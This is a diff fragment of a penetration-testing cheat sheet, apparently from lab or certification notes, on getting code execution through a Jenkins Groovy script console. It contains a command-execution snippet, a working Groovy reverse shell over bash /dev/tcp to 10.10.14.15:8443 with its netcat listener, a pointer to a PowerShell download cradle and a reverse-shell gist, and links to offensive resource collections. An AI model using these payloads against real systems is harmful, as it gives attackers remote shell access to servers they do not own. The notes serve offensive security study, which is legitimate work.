+	- 		def cmd = 'id'
 		def sout = new StringBuffer(), serr = new StringBuffer()
 		def proc = cmd.execute()
 		proc.consumeProcessOutput(sout, serr)
 		proc.waitForOrKill(1000)
 		println sout
-	--> Run
+	- Run
 
-	OR Reverse Shell
-	--> 
+	# OR — Reverse shell
+
 		r = Runtime.getRuntime()
 		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 		p.waitFor()
-	--> nc -lvnp 8443
+	- nc -lvnp 8443
 
-	OR via windows
-	--> Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. We could run commands on a Windows-based Jenkins install using this snippet:
+	# OR — via Windows
+	- Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with Invoke-PowerShellTcp.ps1. We could run commands on a Windows-based Jenkins install using this snippet:
 
-	OR via windows
-	--> https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
+	# OR — via Windows
+	- https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
 
 ```
-## Useful Resources
 
-[HackTriks](https://book.hacktricks.xyz/)
+## 13. Useful Resources
 
-[WADCOMS](https://wadcoms.github.io/#+SMB+Windows)
+[HackTricks](https://book.hacktricks.xyz/)
+
+[WADComs](https://wadcoms.github.io/#+SMB+Windows)
 
 [GTFOBins](https://gtfobins.github.io/)
 
-[SwissKeyRepo - Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+[SwisskyRepo - Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
-[Living Of The Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)
+[Living off the Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)
 
 [Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)
 
